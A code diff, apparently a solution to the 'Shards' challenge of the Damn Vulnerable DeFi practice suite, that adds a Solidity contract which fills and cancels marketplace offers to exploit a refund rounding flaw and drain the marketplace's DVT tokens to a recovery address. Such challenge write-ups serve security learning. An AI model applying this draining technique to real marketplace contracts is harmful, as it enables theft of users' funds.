@@ -12,6 +12,31 @@ import {
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
+contract ShardsExploit {
+    uint64 private constant OFFER_ID = 1;
+
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        // Buy a tiny amount of shards for ~0 cost, then cancel to get initial DVT.
+        marketplace.fill(OFFER_ID, 1);
+        marketplace.cancel(OFFER_ID, 0);
+
+        uint256 balance = token.balanceOf(address(marketplace));
+        uint256 refundPerShard = marketplace.rate() / 1e6;
+        uint256 want = balance / refundPerShard;
+        if (want > 0) {
+            unchecked {
+                want -= 1;
+            }
+        }
+
+        token.approve(address(marketplace), type(uint256).max);
+        uint256 purchaseIndex = marketplace.fill(OFFER_ID, want);
+        marketplace.cancel(OFFER_ID, purchaseIndex);
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+}
+
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -114,7 +139,7 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new ShardsExploit(marketplace, token, recovery);
     }
 
     /**
